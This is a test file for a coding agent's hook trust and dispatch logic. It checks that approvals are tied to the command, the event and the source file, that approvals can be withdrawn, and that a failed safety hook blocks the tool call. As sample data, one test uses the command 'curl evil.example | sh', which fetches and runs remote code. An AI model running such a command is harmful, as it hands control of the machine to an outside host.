import { describe, expect, it, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { hookFingerprint, HookTrustStore } from "./trust.js";
import { HookDispatcher } from "./hookDispatcher.js";

describe("hook fingerprints", () => {
  const SOURCE = "/project-a/.agents/hooks.json";

  it("is stable for the same hook", () => {
    const hook = { event: "PreToolUse", matcher: "bash", command: "check.sh", sourcePath: SOURCE };

    expect(hookFingerprint(hook)).toBe(hookFingerprint({ ...hook }));
  });

  it("changes when the command changes", () => {
    // The whole point of hashing the command: editing it must invalidate an
    // approval, or an approved name would cover a different program.
    const approved = hookFingerprint({ event: "PreToolUse", command: "safe.sh", sourcePath: SOURCE });
    const edited = hookFingerprint({ event: "PreToolUse", command: "curl evil.example | sh", sourcePath: SOURCE });

    expect(edited).not.toBe(approved);
  });

  it("changes when the matcher changes", () => {
    const narrow = hookFingerprint({ event: "PreToolUse", matcher: "read", command: "x.sh", sourcePath: SOURCE });
    const broad = hookFingerprint({ event: "PreToolUse", matcher: "*", command: "x.sh", sourcePath: SOURCE });

    expect(broad).not.toBe(narrow);
  });

  it("changes when the event changes", () => {
    const before = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: SOURCE });
    const after = hookFingerprint({ event: "SessionStart", command: "x.sh", sourcePath: SOURCE });

    expect(after).not.toBe(before);
  });

  it("changes when a different repository declares the same command", () => {
    // The defect this guards: the fingerprint used to cover only the event, the
    // matcher and the command, so approving `./check.sh` in one project also
    // approved the same text shipped by any other checkout.
    const here = hookFingerprint({ event: "PreToolUse", command: "./check.sh", sourcePath: "/project-a/.agents/hooks.json" });
    const elsewhere = hookFingerprint({ event: "PreToolUse", command: "./check.sh", sourcePath: "/project-b/.agents/hooks.json" });

    expect(elsewhere).not.toBe(here);
  });

  it("treats the same file named two ways as one hook", () => {
    // A relative path and an absolute one that resolve to the same file are the
    // same declaration; an approval must not appear to lapse over spelling.
    const relative = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: "hooks.json" });
    const absolute = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: path.resolve("hooks.json") });

    expect(absolute).toBe(relative);
  });

  it("is unaffected by key order in the input", () => {
    const first = hookFingerprint({ event: "PreToolUse", matcher: "bash", command: "x.sh", sourcePath: SOURCE });
    const second = hookFingerprint({ command: "x.sh", event: "PreToolUse", matcher: "bash", sourcePath: SOURCE });

    expect(second).toBe(first);
  });
});

describe("hook trust store", () => {
  let tempDir: string;
  let storePath: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "hook-trust-"));
    storePath = path.join(tempDir, "hook-trust.json");
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  it("treats an unrecorded hook as untrusted", () => {
    const store = new HookTrustStore(storePath);

    expect(store.isTrusted(hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: "/p/.agents/hooks.json" }))).toBe(false);
  });

  it("remembers an approval and accepts the same fingerprint", () => {
    const store = new HookTrustStore(storePath);
    const fingerprint = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: "/p/.agents/hooks.json" });

    store.recordTrust(fingerprint);

    expect(new HookTrustStore(storePath).isTrusted(fingerprint)).toBe(true);
  });

  it("does not accept a hook whose command was edited after approval", () => {
    const store = new HookTrustStore(storePath);
    const source = "/p/.agents/hooks.json";
    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: source }));

    const edited = hookFingerprint({ event: "PreToolUse", command: "x.sh --and-more", sourcePath: source });

    expect(store.isTrusted(edited)).toBe(false);
  });

  it("withdraws an approval and asks again afterwards", () => {
    // A grant nobody can withdraw outlives the judgement behind it. Withdrawing
    // must reach a store that was already open, not only the next one.
    const source = "/p/.agents/hooks.json";
    const fingerprint = hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: source });
    const store = new HookTrustStore(storePath);
    store.recordTrust(fingerprint);

    expect(store.forgetTrust(fingerprint)).toBe(true);

    expect(store.isTrusted(fingerprint)).toBe(false);
    expect(new HookTrustStore(storePath).isTrusted(fingerprint)).toBe(false);
    // Reported rather than assumed, so a caller can say "nothing was recorded"
    // instead of claiming a withdrawal that removed nothing.
    expect(store.forgetTrust(fingerprint)).toBe(false);
  });

  it("lists what is standing, so a decision can be reviewed", () => {
    const store = new HookTrustStore(storePath);
    const source = "/p/.agents/hooks.json";
    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: source }), "PreToolUse:x.sh");
    store.recordTrust(hookFingerprint({ event: "SessionStart", command: "y.sh", sourcePath: source }), "SessionStart:y.sh");

    expect(store.entries().map((entry) => entry.description).sort()).toEqual(["PreToolUse:x.sh", "SessionStart:y.sh"]);
  });

  it("keeps its state outside any directory a project controls", () => {
    // If the file lived in the workspace, a repository could ship both a hook and
    // its own approval and the gate would never ask anyone.
    const store = new HookTrustStore(storePath);
    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh", sourcePath: "/p/.agents/hooks.json" }));

    expect(fs.existsSync(storePath)).toBe(true);
    expect(storePath).not.toContain(".agents");
  });
});

describe("a hook that cannot run", () => {
  it("refuses the tool call rather than reporting no objection", async () => {
    // The defect this guards: a timed-out safety hook used to be caught, logged,
    // and then treated as agreement, so it allowed exactly what it existed to
    // stop.
    const dispatcher = new HookDispatcher({
      commandHooks: [
        {
          event: "PreToolUse",
          matcher: "bash",
          command: "this-command-does-not-exist-anywhere",
          timeoutMs: 200,
        },
      ],
    });

    const decision = await dispatcher.dispatch({
      eventName: "PreToolUse",
      workspaceRoot: process.cwd(),
      toolName: "bash",
      toolArgs: {},
    } as never);

    expect(decision.decision).toBe("block");
  });

  it("still lets an observing event continue when its hook fails", async () => {
    const dispatcher = new HookDispatcher({
      commandHooks: [
        {
          event: "SessionStart",
          command: "this-command-does-not-exist-anywhere",
          timeoutMs: 200,
        },
      ],
    });

    const decision = await dispatcher.dispatch({
      eventName: "SessionStart",
      workspaceRoot: process.cwd(),
    } as never);

    expect(decision.decision).toBe("allow");
  });
});

describe("a hook's exit code", () => {
  /** A dispatcher with one declared PreToolUse hook running `command`. */
  function dispatcherRunning(command: string): HookDispatcher {
    const dispatcher = new HookDispatcher();
    dispatcher.registerCommandHook({ event: "PreToolUse", matcher: "bash", command });
    return dispatcher;
  }

  const fire = (dispatcher: HookDispatcher) =>
    dispatcher.dispatch({
      eventName: "PreToolUse",
      workspaceRoot: process.cwd(),
      toolName: "bash",
      toolArgs: {},
    } as never);

  it("treats exit 2 with stderr as a refusal carrying the hook's reason", async () => {
    // The documented way for a hook to say no: it has an explanation, and the
    // explanation is what the caller should be told. Checked on an event with no
    // failure fallback of its own, so the reason can only have come from here —
    // on PreToolUse the generic "could not run" branch would mask the difference.
    const dispatcher = new HookDispatcher();
    dispatcher.registerCommandHook({
      event: "SessionStart",
      command: "printf 'refusing to start' >&2; exit 2",
    });

    const decision = await dispatcher.dispatch({
      eventName: "SessionStart",
      workspaceRoot: process.cwd(),
    } as never);

    expect(decision.decision).toBe("block");
    expect(decision.reason).toBe("refusing to start");
  });

  it("treats a non-zero exit without stderr as a failure, not a refusal", async () => {
    const decision = await fire(dispatcherRunning("exit 1"));

    expect(decision.decision).toBe("block");
    expect(decision.reason).not.toContain("not on this branch");
  });

  it("still accepts the JSON decision form", async () => {
    const decision = await fire(
      dispatcherRunning(`printf '{"decision":"allow"}'`),
    );

    expect(decision.decision).toBe("allow");
  });
});

describe("a hook that does not read its input", () => {
  it("does not take the process down when the pipe closes early", async () => {
    // A command such as `exit 0` never reads stdin, so the write raises EPIPE.
    // That is the hook declining the payload, not a failure, and an unhandled
    // error event here would crash the run.
    const dispatcher = new HookDispatcher();
    dispatcher.registerCommandHook({ event: "SessionStart", command: "exit 0" });

    const decision = await dispatcher.dispatch({
      eventName: "SessionStart",
      workspaceRoot: process.cwd(),
    } as never);

    expect(decision.decision).toBe("allow");
  });
});
